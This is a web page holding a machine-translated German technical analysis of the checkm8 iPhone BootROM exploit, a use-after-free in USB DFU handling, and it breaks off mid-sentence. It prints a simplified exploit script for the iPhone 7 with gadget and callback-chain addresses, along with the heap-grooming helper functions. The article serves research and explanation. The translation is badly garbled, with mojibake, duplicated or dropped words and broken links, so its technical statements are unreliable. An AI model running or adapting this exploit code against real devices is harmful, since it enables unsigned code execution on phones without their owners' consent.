<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§¥üèæ üïï üíÉüèª Technische Analyse des checkm8-Exploits üöæ üë®üèø‚Äçüé§ ‚úäüèª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="H√∂chstwahrscheinlich haben Sie bereits von dem ber√ºhmten Exploit checkm8 geh√∂rt , der eine nicht behebbare Sicherheitsanf√§lligkeit im BootROM der meis...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Technische Analyse des checkm8-Exploits</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472762/"><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/3l/k0/i2/3lk0i27tlko9sqankyec8rouqhw.png"></div><br><p> H√∂chstwahrscheinlich haben Sie bereits von dem ber√ºhmten Exploit <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">checkm8 geh√∂rt</a> , der eine nicht behebbare Sicherheitsanf√§lligkeit im <code>BootROM</code> der meisten iDevices, einschlie√ülich <code>iPhone X</code>  In diesem Artikel werden wir eine technische Analyse dieses Exploits bereitstellen und herausfinden, was die Sicherheitsanf√§lligkeit verursacht. </p><a name="habracut"></a><br><p>  Die russische Version k√∂nnen Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> lesen. </p><br><h2 id="introduction">  Einf√ºhrung </h2><br><p>  Lassen Sie uns zun√§chst kurz den <code>BootROM</code> eines iDevice und die Rolle beschreiben, die <code>BootROM</code> (auch bekannt als <code>SecureROM</code> ) darin spielt.  Detaillierte Informationen dazu finden Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> .  So sieht das Booten aus: </p><br><p><img src="https://habrastorage.org/webt/kh/xi/tl/khxitlvaiov5lgx4kt45cq3qng4.png"></p><br><p>  Wenn das Ger√§t eingeschaltet ist, wird zuerst <code>BootROM</code> ausgef√ºhrt.  Seine Hauptaufgaben sind: </p><br><ul><li>  Plattforminitialisierung (erforderliche Plattformregister sind installiert, <code>CPU</code> wird initialisiert usw.) </li><li>  √úberpr√ºfung und √úbertragung der Kontrolle auf die n√§chste Stufe <br><ul><li>  <code>BootROM</code> unterst√ºtzt das Parsen von <code>IMG3/IMG4</code> Images </li><li>  <code>BootROM</code> hat Zugriff auf den <code>GID</code> Schl√ºssel zum Entschl√ºsseln von Bildern </li><li>  <code>BootROM</code> verf√ºgt <code>BootROM</code> √ºber einen integrierten √∂ffentlichen <code>Apple</code> Schl√ºssel und die erforderlichen kryptografischen Funktionen </li></ul></li><li>  Stellen Sie das Ger√§t wieder her, wenn kein weiteres Booten m√∂glich ist ( <code>Device Firmware Update</code> , <code>DFU</code> ). </li></ul><br><p>  <code>BootROM</code> ist sehr klein und kann als Light-Version von <code>iBoot</code> , da sie den gr√∂√üten Teil des System- und Bibliothekscodes gemeinsam nutzen.  Im Gegensatz zu <code>iBoot</code> kann <code>BootROM</code> jedoch nicht aktualisiert werden.  Es wird bei der Herstellung eines Ger√§ts in den internen Nur-Lese-Speicher gestellt.  <code>BootROM</code> ist die Hardware-Vertrauensbasis der sicheren <code>BootROM</code> .  <code>BootROM</code> Schwachstellen kann ein Angreifer den <code>BootROM</code> steuern und nicht signierten Code auf einem Ger√§t ausf√ºhren. </p><br><p><img src="https://habrastorage.org/webt/9a/pr/po/9aprpovk-0wg8fs7uya3axvs86s.png"></p><br><h2 id="the-history-of-checkm8">  Die Geschichte von checkm8 </h2><br><p>  Der <code>checkm8</code> Exploit wurde am 27. September 2019 von seinem Autor <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">axi0mX</a> zu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ipwndfu</a> hinzugef√ºgt. Gleichzeitig <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">k√ºndigte er</a> das Update auf Twitter an und lieferte eine Beschreibung und zus√§tzliche Informationen zum Exploit.  Laut dem Thread fand er die Sicherheitsl√ºcke im <code>USB</code> Code, w√§hrend <code>iBoot</code> f√ºr <code>iOS 12 beta</code> im Sommer 2018 <code>iBoot</code> . <br>  <code>BootROM</code> und <code>iBoot</code> teilen den gr√∂√üten Teil ihres Codes, einschlie√ülich <code>USB</code> , sodass diese Sicherheitsanf√§lligkeit auch f√ºr <code>BootROM</code> relevant <code>BootROM</code> . </p><br><p>  Wie aus dem Code des Exploits hervorgeht, wird die Sicherheitsanf√§lligkeit in <code>DFU</code> ausgenutzt.  Dies ist ein Modus, in dem ein signiertes Image √ºber <code>USB</code> auf ein Ger√§t √ºbertragen werden <code>USB</code> , das sp√§ter gestartet wird.  Dies kann beispielsweise n√ºtzlich sein, um ein Ger√§t nach einem erfolglosen Update wiederherzustellen. </p><br><p>  Am selben Tag <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">teilte</a> der Benutzer <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">littlelailo mit</a> , dass er diese Sicherheitsanf√§lligkeit bereits im M√§rz gefunden und eine Beschreibung in <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">apollo.txt ver√∂ffentlicht habe</a> .  Die Beschreibung entsprach <code>checkm8</code> , obwohl nicht alle Details des Exploits beim Lesen klar werden.  Aus diesem Grund haben wir uns entschlossen, diesen Artikel zu schreiben und alle Details der Ausnutzung bis zur Ausf√ºhrung der Nutzdaten in <code>BootROM</code> . </p><br><p>  Wir haben unsere Analyse des Exploits auf die oben genannten Ressourcen und den Quellcode von <code>iBoot/SecureROM</code> , der im Februar 2018 durchgesickert ist. Wir haben auch die Daten verwendet, die wir aus den Experimenten mit unserem Testger√§t <code>iPhone 7</code> ( <code>CPID:8010</code> )  Mit <code>checkm8</code> haben wir die Dumps von <code>SecureROM</code> und <code>SecureRAM</code> , die auch f√ºr die Analyse hilfreich waren. </p><br><h2 id="necessary-info-about-usb">  Notwendige Infos zu USB </h2><br><p>  Da sich die Sicherheitsanf√§lligkeit im <code>USB</code> Code befindet, muss bekannt sein, wie diese Schnittstelle funktioniert.  Die vollst√§ndigen Spezifikationen finden Sie unter <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">https://www.usb.org/</a> , aber es ist eine lange Lekt√ºre.  F√ºr unsere Zwecke ist <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">USB in a NutShell</a> mehr als genug.  Hier werden nur die relevantesten Punkte erw√§hnt. </p><br><p>  Es gibt verschiedene Arten der <code>USB</code> Daten√ºbertragung.  In <code>DFU</code> wird nur der <code>Control Transfers</code> Modus verwendet (lesen Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> mehr dar√ºber).  In diesem Modus besteht jede Transaktion aus drei Phasen: </p><br><a name="setup_packet"></a><br><ul><li>  <code>Setup Stage</code> - Ein <code>SETUP</code> Paket wird gesendet.  Es hat die folgenden Felder: <br><ul><li>  <code>bmRequestType</code> - <code>bmRequestType</code> die Richtung der Anforderung, ihren Typ und den Empf√§nger </li><li>  <code>bRequest</code> - <code>bRequest</code> die Anforderung, die gestellt werden soll </li><li>  <code>wValue</code> , <code>wIndex</code> - werden je nach Anforderung interpretiert </li><li>  <code>wLength</code> - <code>wLength</code> die L√§nge der gesendeten / empfangenen Daten in <code>Data Stage</code> </li></ul></li><li>  <code>Data Stage</code> - eine optionale Phase der Daten√ºbertragung.  Abh√§ngig vom <code>SETUP</code> Paket, das w√§hrend der <code>Setup Stage</code> gesendet wurde, k√∂nnen die Daten vom Host zum Ger√§t ( <code>OUT</code> ) oder umgekehrt ( <code>IN</code> ) gesendet werden.  Die Daten werden in kleinen Portionen gesendet (im Fall von <code>Apple DFU</code> sind es 0x40 Bytes). <br><ul><li>  Wenn ein Host einen anderen Teil der Daten senden m√∂chte, sendet er ein <code>OUT</code> Token und dann die Daten selbst. </li><li>  Wenn ein Host bereit ist, Daten von einem Ger√§t zu empfangen, sendet er ein <code>IN</code> Token an das Ger√§t. </li></ul></li><li>  <code>Status Stage</code> - die letzte Phase;  Der Status der gesamten Transaktion wird gemeldet. <br><ul><li>  Bei <code>OUT</code> Anforderungen sendet der Host ein <code>IN</code> Token, auf das das Ger√§t mit einem Paket mit der L√§nge Null antworten muss. </li><li>  Bei <code>IN</code> Anforderungen sendet der Host ein <code>OUT</code> Token und ein Paket mit der L√§nge Null. </li></ul></li></ul><br><p>  Das folgende Schema zeigt <code>OUT</code> und <code>IN</code> Anforderungen.  Wir haben <code>NACK</code> , <code>NACK</code> und andere Handshake-Pakete herausgenommen, da diese f√ºr den Exploit selbst nicht wichtig sind. </p><br><p><img src="https://habrastorage.org/webt/lq/cm/-i/lqcm-itvvltjac1kkadebsszkkq.png"></p><br><h2 id="analysis-of-apollotxt">  Analyse von apollo.txt </h2><br><p>  Wir haben die Analyse mit der Sicherheitsl√ºcke von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">apollo.txt begonnen</a> .  Das Dokument beschreibt den Algorithmus des <code>DFU</code> Modus: </p><br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4</a> <br><ol><li>  Wenn USB gestartet wird, um ein Bild √ºber dfu zu erhalten, registriert dfu eine Schnittstelle, um alle Befehle zu verarbeiten, und weist einen Puffer f√ºr die Eingabe und Ausgabe zu </li><li>  Wenn Sie Daten an dfu senden, wird das Setup-Paket vom Hauptcode verarbeitet, der dann den Schnittstellencode aufruft </li><li>  Der Schnittstellencode √ºberpr√ºft, ob wLength k√ºrzer als die L√§nge des Eingabeausgabepuffers ist. In diesem Fall wird ein als Argument √ºbergebener Zeiger mit einem Zeiger auf den Eingabeausgabepuffer aktualisiert </li><li>  es gibt dann wLength zur√ºck, die die L√§nge ist, die es in den Puffer empfangen m√∂chte </li><li>  Der USB-Hauptcode aktualisiert dann eine globale Variable mit der L√§nge und macht sich bereit, die Datenpakete zu empfangen </li><li>  Wenn ein Datenpaket empfangen wird, wird es √ºber den Zeiger, der als Argument √ºbergeben wurde, in den Eingabeausgabepuffer geschrieben, und eine andere globale Variable wird verwendet, um zu verfolgen, wie viele Bytes bereits empfangen wurden </li><li>  Wenn alle Daten empfangen wurden, wird der dfu-spezifische Code erneut aufgerufen. Anschlie√üend wird der Inhalt des Eingabe-Ausgabepuffers an den Speicherort kopiert, von dem aus das Bild sp√§ter gestartet wird </li><li>  Danach setzt der USB-Code alle Variablen zur√ºck und bearbeitet neue Pakete </li><li>  Wenn dfu beendet wird, wird der Eingabe- / Ausgabepuffer freigegeben, und wenn das Parsen des Bildes fehlschl√§gt, wird das Bootrom erneut aktiviert </li></ol><br></blockquote><p>  Zuerst haben wir diese Schritte mit dem Quellcode von <code>iBoot</code> .  Wir k√∂nnen die Fragmente des durchgesickerten Codes hier nicht verwenden, daher verwenden wir den Pseudocode, den wir durch das Reverse Engineering des <code>SecureROM</code> unseres <code>iPhone7</code> in <code>IDA</code> .  Sie k√∂nnen den Quellcode von <code>iBoot</code> leicht finden und darin navigieren. </p><br><p>  Bei der Initialisierung der <code>DFU</code> wird ein <code>IO</code> Puffer zugewiesen und eine <code>USB</code> Schnittstelle zur Verarbeitung der Anforderungen an die <code>DFU</code> registriert: </p><br><p><img src="https://habrastorage.org/webt/2r/il/hz/2rilhzhao9dq9561t0nou161xos.png"></p><br><p>  Wenn das <code>SETUP</code> Paket einer Anforderung an <code>DFU</code> eingeht, wird ein geeigneter Schnittstellenhandler aufgerufen.  Bei <code>OUT</code> Anforderungen (z. B. wenn ein Bild gesendet wird) muss der Handler bei erfolgreicher Ausf√ºhrung die Adresse des <code>IO</code> Puffers f√ºr die Transaktion sowie die erwartete Datenl√§nge zur√ºckgeben.  Beide Werte werden in globalen Variablen gespeichert. </p><br><p><img src="https://habrastorage.org/webt/ha/d7/7i/had77ibmhmmxpmnfmuwqgop96ps.png"></p><br><p>  Der folgende Screenshot zeigt den <code>DFU</code> Schnittstellenhandler.  Wenn eine Anforderung korrekt ist, werden die Adresse des w√§hrend der <code>DFU</code> Initialisierung zugewiesenen <code>IO</code> Puffers und die erwartete <code>SETUP</code> aus dem <code>SETUP</code> Paket zur√ºckgegeben. </p><br><p><img src="https://habrastorage.org/webt/v1/ws/cp/v1wscp8-tw9pwanbkcjal_9zpv4.png"></p><br><p>  W√§hrend der <code>Data Stage</code> wird jeder Teil der Daten in den <code>IO</code> Puffer geschrieben, und dann wird die <code>IO</code> Pufferadresse versetzt und der empfangene Z√§hler aktualisiert.  Wenn alle erwarteten Daten empfangen wurden, wird der Schnittstellendatenhandler aufgerufen und der globale Status der Transaktion gel√∂scht. </p><br><p><img src="https://habrastorage.org/webt/w7/-n/oo/w7-noo36ubqoc4wznkxjezxs_tu.png"></p><br><p>  Im <code>DFU</code> Datenhandler werden die empfangenen Daten in den Speicherbereich verschoben, aus dem sie sp√§ter geladen werden.  Basierend auf dem Quellcode von <code>iBoot</code> hei√üt dieser Bereich auf <code>Apple</code> Ger√§ten <code>INSECURE_MEMORY</code> . </p><br><p><img src="https://habrastorage.org/webt/ep/sd/ro/epsdro1dycadjstreuvdpkejksa.png"></p><br><p>  Wenn das Ger√§t den <code>DFU</code> Modus verl√§sst, wird der zuvor zugewiesene <code>IO</code> Puffer freigegeben.  Wenn das Bild im <code>DFU</code> Modus erfolgreich aufgenommen wurde, wird es √ºberpr√ºft und gestartet.  Wenn ein Fehler aufgetreten ist oder das Image nicht <code>DFU</code> werden konnte, wird die <code>DFU</code> erneut initialisiert und der gesamte Vorgang von Anfang an wiederholt. </p><br><p>  Der beschriebene Algorithmus weist eine Sicherheitsanf√§lligkeit auf.  Wenn wir zum Zeitpunkt des Hochladens des Bildes ein <code>SETUP</code> Paket senden und die Datenphase zum √úberspringen von Transaktionen abschlie√üen, bleibt der globale Status w√§hrend des n√§chsten <code>DFU</code> Zyklus initialisiert, und wir k√∂nnen an die Adresse des <code>IO</code> Puffers schreiben, der w√§hrend des vorherigen zugewiesen wurde Iteration der <code>DFU</code> . </p><br><p>  <code>use-after-free</code> wir nun wissen, wie <code>use-after-free</code> funktioniert, stellt sich die Frage, wie wir bei der n√§chsten Iteration der <code>DFU</code> etwas √ºberschreiben k√∂nnen.  Vor einer erneuten Initialisierung der <code>DFU</code> werden alle zuvor zugewiesenen Ressourcen freigegeben, und die Speicherzuweisung in einer neuen Iteration muss genau gleich sein.  Wie sich herausstellte, gibt es einen weiteren interessanten Speicherverlustfehler, der es erm√∂glicht, die <code>use-after-free</code> auszunutzen. </p><br><h2 id="analysis-of-checkm8">  Analyse von checkm8 </h2><br><p>  <code>checkm8</code> wir zu <code>checkm8</code> .  Zur Demonstration verwenden wir eine vereinfachte Version des Exploits f√ºr das <code>iPhone 7</code> , in der wir den gesamten Code f√ºr andere Plattformen herausgenommen und die Reihenfolge und Art der <code>USB</code> Anforderungen ge√§ndert haben, ohne die Funktionalit√§t zu beeintr√§chtigen.  Wir haben auch den Prozess des <code>checkm8.py</code> einer Nutzlast <code>checkm8.py</code> , der in der Originaldatei <code>checkm8.py</code> .  Es ist leicht, die Unterschiede zwischen den Versionen f√ºr andere Ger√§te zu erkennen. </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python from checkm8 import * def main(): print '*** checkm8 exploit by axi0mX ***' device = dfu.acquire_device(1800) start = time.time() print 'Found:', device.serial_number if 'PWND:[' in device.serial_number: print 'Device is already in pwned DFU Mode. Not executing exploit.' return payload, _ = exploit_config(device.serial_number) t8010_nop_gadget = 0x10000CC6C callback_chain = 0x1800B0800 t8010_overwrite = '\0' * 0x5c0 t8010_overwrite += struct.pack('&lt;32x2Q', t8010_nop_gadget, callback_chain) # heap feng-shui stall(device) leak(device) for i in range(6): no_leak(device) dfu.usb_reset(device) dfu.release_device(device) # set global state and restart usb device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001) libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0) dfu.release_device(device) time.sleep(0.5) # heap occupation device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50) for i in range(0, len(payload), 0x800): libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50) dfu.usb_reset(device) dfu.release_device(device) device = dfu.acquire_device() if 'PWND:[checkm8]' not in device.serial_number: print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.' sys.exit(1) print 'Device is now in pwned DFU Mode.' print '(%0.2f seconds)' % (time.time() - start) dfu.release_device(device) if __name__ == '__main__': main()</span></span></code> </pre> <br><p>  Der Betrieb von <code>checkm8</code> besteht aus mehreren Schritten: </p><br><ol><li>  Haufen Feng-Shui </li><li>  Zuweisung und Freigabe des <code>IO</code> Puffers ohne L√∂schen des globalen Status </li><li>  √úberschreiben von <code>usb_device_io_request</code> im Heap mit <code>use-after-free</code> </li><li>  Nutzlast platzieren </li><li>  Ausf√ºhrung der <code>callback-chain</code> </li><li>  Ausf√ºhrung von <code>shellcode</code> </li></ol><br><p>  Schauen wir uns alle Phasen im Detail an. </p><br><h2 id="1-heap-feng-shui">  1. Haufen Feng-Shui </h2><br><p>  Wir denken, dass es die interessanteste Phase ist, also werden wir mehr Zeit damit verbringen, sie zu beschreiben. </p><br><pre> <code class="python hljs">stall(device) leak(device) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">6</span></span>): no_leak(device) dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p>  Diese Phase ist erforderlich, um den Heap so anzuordnen, dass die Nutzung nach der <code>use-after-free</code> vorteilhaft ist.  Betrachten wir zun√§chst die Anrufe <code>stall</code> , <code>leak</code> , <code>no_leak</code> : </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stall</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">0.00001</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">no_leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC1</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br><p>  <code>libusb1_no_error_ctrl_transfer</code> ist ein Wrapper f√ºr <code>device.ctrlTransfer</code> , der alle Ausnahmen ignoriert, die w√§hrend der Ausf√ºhrung einer Anforderung auftreten.  <code>libusb1_async_ctrl_transfer</code> ist ein Wrapper f√ºr die Funktion <code>libusb_submit_transfer</code> von <code>libusb</code> f√ºr die asynchrone Ausf√ºhrung einer Anforderung. </p><br><p>  Die folgenden Parameter werden an diese Aufrufe √ºbergeben: </p><br><ul><li>  Ger√§tenummer </li><li>  Daten f√ºr das <code>SETUP</code> Paket (hier finden Sie die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Beschreibung</a> ): <br><ul><li> <code>bmRequestType</code> </li> <li> <code>bRequest</code> </li> <li> <code>wValue</code> </li> <li> <code>wIndex</code> </li> </ul></li><li>  <code>wLength</code> ( <code>wLength</code> ) oder Daten f√ºr die <code>wLength</code> </li><li>  Timeout anfordern </li></ul><br><p>  Die Argumente <code>bmRequestType</code> , <code>bRequest</code> , <code>wValue</code> und <code>wIndex</code> werden von allen drei Anforderungstypen gemeinsam genutzt: </p><br><ul><li> <code>bmRequestType = 0x80</code> <br> <ul><li>  <code>0b1XXXXXXX</code> - Richtung der <code>0b1XXXXXXX</code> (Ger√§t zum Host) </li><li>  <code>0bX00XXXXX</code> - Standardanforderungstyp </li><li>  <code>0bXXX00000</code> - Ger√§t ist der Empf√§nger der Anforderung </li></ul></li><li>  <code>bRequest = 6</code> - Anforderung zum <code>GET_DESCRIPTOR</code> eines Deskriptors ( <code>GET_DESCRIPTOR</code> ) </li><li> <code>wValue = 0x304</code> <br> <ul><li>  <code>wValueHigh = 0x3</code> - definiert den Typ der Deskriptorzeichenfolge ( <code>USB_DT_STRING</code> ) </li><li>  <code>wValueLow = 0x4</code> - Der Index des Zeichenfolgendeskriptors 4 entspricht der Seriennummer des Ger√§ts (in diesem Fall lautet die Zeichenfolge <code>CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</code> ) </li></ul></li><li>  <code>wIndex = 0x40A</code> - Der <code>wIndex = 0x40A</code> der Sprache der Zeichenfolge, dessen Wert f√ºr die Ausnutzung nicht relevant ist und ge√§ndert werden kann. </li></ul><br><p>  F√ºr jede dieser Anforderungen werden 0x30 Bytes im Heap f√ºr ein Objekt mit der folgenden Struktur zugewiesen: </p><br><p><img src="https://habrastorage.org/webt/-e/ub/wb/-eubwbh-2fhsjb9bs36t0qom7be.png"></p><br><p>  Die interessantesten Felder dieses Objekts sind <code>callback</code> und <code>next</code> . </p><br><ul><li>  <code>callback</code> ist der Zeiger auf die Funktion, die aufgerufen wird, wenn die Anforderung abgeschlossen ist. </li><li>  <code>next</code> ist der Zeiger auf das n√§chste Objekt des gleichen Typs.  Es ist erforderlich, um die Anforderungswarteschlange zu organisieren. </li></ul><br><p>  Das Hauptmerkmal von <code>stall</code> ist die Verwendung der asynchronen Ausf√ºhrung einer Anforderung mit einem minimalen Zeitlimit.  Wenn wir Gl√ºck haben, wird die Anforderung auf Betriebssystemebene abgebrochen und verbleibt in der Ausf√ºhrungswarteschlange, und die Transaktion wird nicht abgeschlossen.  Au√üerdem empf√§ngt das Ger√§t weiterhin alle anstehenden <code>SETUP</code> Pakete und stellt sie bei Bedarf in die Ausf√ºhrungswarteschlange.  Sp√§ter, als wir mit dem <code>USB</code> Controller auf <code>Arduino</code> experimentierten, stellten wir fest, dass der Host f√ºr eine erfolgreiche Ausnutzung ein <code>SETUP</code> Paket und ein <code>IN</code> Token senden muss. <code>SETUP</code> die Transaktion aufgrund eines Timeouts abgebrochen werden.  Diese unvollst√§ndige Transaktion sieht folgenderma√üen aus: </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/sh/zq/ia/shzqiacghex3lk7jc9nhgoz3m7g.png"></div><br><p>  Au√üerdem unterscheiden sich die Anforderungen in der L√§nge nur um eine Einheit.  F√ºr Standardanforderungen gibt es einen Standardr√ºckruf, der folgenderma√üen aussieht: </p><br><p><img src="https://habrastorage.org/webt/cx/as/gn/cxasgnrqyant31ostgflo85zxro.png"></p><br><p>  Der Wert von <code>io_length</code> entspricht dem Minimum von <code>wLength</code> im <code>SETUP</code> Paket der Anforderung und der urspr√ºnglichen L√§nge des angeforderten Deskriptors.  Da der Deskriptor ziemlich lang ist, k√∂nnen wir den Wert von <code>io_length</code> innerhalb seiner L√§nge steuern.  Der Wert von <code>g_setup_request.wLength</code> entspricht dem Wert von <code>wLength</code> aus dem letzten <code>SETUP</code> Paket.  In diesem Fall ist es <code>0xC1</code> . </p><br><p>  Somit sind die Anforderungen, die durch das <code>usb_core_send_zlp()</code> und <code>usb_core_send_zlp()</code> der Anrufe gebildet werden, abgeschlossen, die Bedingung in der Terminalr√ºckruffunktion ist erf√ºllt und <code>usb_core_send_zlp()</code> wird aufgerufen.  Dieser Aufruf erstellt ein Nullpaket ( <code>zero-length-packet</code> ) und f√ºgt es der Ausf√ºhrungswarteschlange hinzu.  Dies ist f√ºr den korrekten Abschluss der Transaktion in der <code>Status Stage</code> erforderlich. </p><br><p>  Die Anforderung wird durch Aufrufen der Funktion <code>usb_core_complete_endpoint_io</code> .  Zuerst ruft es den <code>callback</code> und gibt dann den Speicher der Anforderung frei.  Die Anforderung ist nicht nur abgeschlossen, wenn die gesamte Transaktion abgeschlossen ist, sondern auch, wenn <code>USB</code> zur√ºckgesetzt wird.  Wenn das Signal zum Zur√ºcksetzen von <code>USB</code> empfangen wird, sind alle Anforderungen in der Ausf√ºhrungswarteschlange abgeschlossen. </p><br><p>  Durch selektives Aufrufen von <code>usb_core_send_zlp()</code> beim Durchlaufen der Ausf√ºhrungswarteschlange und anschlie√üendes Freigeben der Anforderungen k√∂nnen wir eine ausreichende Kontrolle √ºber den Heap f√ºr die Ausnutzung von <code>use-after-free</code> erlangen.  Schauen wir uns zun√§chst die Anforderungsbereinigungsschleife an: </p><br><p><img src="https://habrastorage.org/webt/ik/tn/ym/iktnymzi4lywmtf1xsmcfsgpyb4.png"></p><br><p>  Wie Sie sehen k√∂nnen, wird die Warteschlange geleert, und dann werden die abgebrochenen Anforderungen von <code>usb_core_complete_endpoint_io</code> ausgef√ºhrt und abgeschlossen.  Die von <code>usb_core_send_zlp</code> zugewiesenen <code>usb_core_send_zlp</code> werden in <code>ep-&gt;io_head</code> .  Nach dem Zur√ºcksetzen des <code>USB</code> <code>io_head</code> alle Informationen zum Endpunkt <code>io_head</code> , einschlie√ülich der Zeiger <code>io_head</code> und <code>io_tail</code> , und die <code>io_tail</code> mit der L√§nge Null verbleiben im Heap.  Auf diese Weise k√∂nnen wir einen kleinen Block inmitten 